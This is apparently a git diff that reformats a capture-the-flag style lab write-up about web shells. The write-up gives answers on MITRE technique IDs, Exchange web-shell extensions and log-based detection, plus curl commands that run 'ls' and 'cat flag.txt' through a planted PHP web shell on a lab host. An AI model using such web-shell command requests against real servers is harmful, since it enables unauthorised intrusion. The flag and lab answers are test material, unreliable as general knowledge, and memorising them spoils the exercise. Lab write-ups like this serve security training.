@@ -55,7 +55,7 @@ For screenshots and captions
 
 I understand the learning objectives and am ready to embark on a web shell adventure.
 
-**Answer:** > No answer needed
+ > **Answer:** No answer needed
 
 ---
 
@@ -75,13 +75,13 @@ This can be easily found with a quick internet search.
 
 </div>
 
-**Answer:** > T1505.003
+ > **Answer:** T1505.003
 
 <h2>What file extension is commonly used for web shells targeting Microsoft Exchange?</h2>
 
 According to the examples presented in the lab of real-world web-shell deployment, the file extension commonly used for web shells targeting Microsoft Exchange is .aspx
 
-**Answer:** > .aspx
+> **Answer:** .aspx
 
 ---
 
@@ -112,7 +112,7 @@ www-data
 
 Thus giving us our answer.
 
-**Answer**: > www-data
+> **Answer:** www-data
 
 
 <h3>List the directory contents and find the flag using the ls and cat commands.</h3>
@@ -122,8 +122,7 @@ When necessary, I made sure to URL encode my commands using CyberChef before int
 ## Commands Executed
 
 ### Command 1 - ls
-```
-bash
+```bash
 curl http://10.64.135.10:8080/files/awebshell.php?cmd=ls
 ```
 ### Command 1 - Output
@@ -134,14 +133,12 @@ flag.txt
 ```
 
 ### Command 2 - cat%20flag.txt
-```
-bash
+```bash
 curl http://10.64.135.10:8080/files/awebshell.php?cmd=cat%20flag.txt
 ```
 
 ### Command 2 - Output
-```
-bash
+```bash
 THM{W3b_Sh3ll_Usag3}
 ```
 ## Screencaptures
@@ -171,7 +168,7 @@ THM{W3b_Sh3ll_Usag3}
 
 </div>
 
-**Answer:** > THM{W3b_Sh3ll_Usag3}
+> **Answer:** THM{W3b_Sh3ll_Usag3}
 
 ---
 ## Task 4: Log-Based Detection
@@ -182,12 +179,12 @@ The answer to the below questions can be found through the task readings, howeve
 
 <h3>What is the part of the URL that associates values to parameters and can be a valuable indicator of web shell activity?</h3>
 
-**Answer:** > query strings
+> **Answer:** query strings
 
 Query strings are the part of the URL that come after the question mark '?' symbol, and web shells commonly use these to accept commands, making them a key indicator of malicious activity.
 
 <h3>What auditd syscall would confirm that a file was written to disk following a suspicious POST request to /upload.php?</h3>
 
-**Answer:** > creat
+> **Answer:** creat
 
 "creat"
